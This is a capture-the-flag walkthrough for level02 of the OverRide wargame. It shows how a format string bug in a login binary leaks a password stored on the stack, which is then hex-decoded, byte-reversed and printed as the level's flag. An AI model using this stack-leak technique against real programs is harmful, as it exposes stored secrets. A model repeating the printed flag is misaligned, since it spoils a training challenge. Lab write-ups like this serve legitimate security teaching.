# level02 walkthrough

## the binary
``` shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: admin
--[ Password: admin
*****************************************
admin does not have access!
```

## methodology
- format string attack

As the <code>main</code> function uses <code>print</code> to output raw array data, we can leverage it to display the variables stored on the stack.
``` shell
level02@OverRide:~$ python /tmp/format_string.py
Sequence 0x7fffffffe3d0 found on stack position 1
Sequence 0x2a2a2a2a2a2a2a2a found on stack position 4
Sequence 0x2a2a2a2a2a2a2a2a found on stack position 5
Sequence 0x7fffffffe5c8 found on stack position 6
Sequence 0x1f7ff9a08 found on stack position 7
Sequence 0x100000000 found on stack position 20
Sequence 0x756e505234376848 found on stack position 22
Sequence 0x45414a3561733951 found on stack position 23
Sequence 0x377a7143574e6758 found on stack position 24
Sequence 0x354a35686e475873 found on stack position 25
Sequence 0x48336750664b394d found on stack position 26
Sequence 0x7024383225 found on stack position 28
Sequence 0x2900000000 found on stack position 40
Sequence 0x602010 found on stack position 41
```
Positions 22 to 26 include hex-encoded sequences that reveal the password after hex-decoding, reversing the endianness, and concatenating.

## flag
``` shell
level02@OverRide:~$ python /tmp/decode.py
flag: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
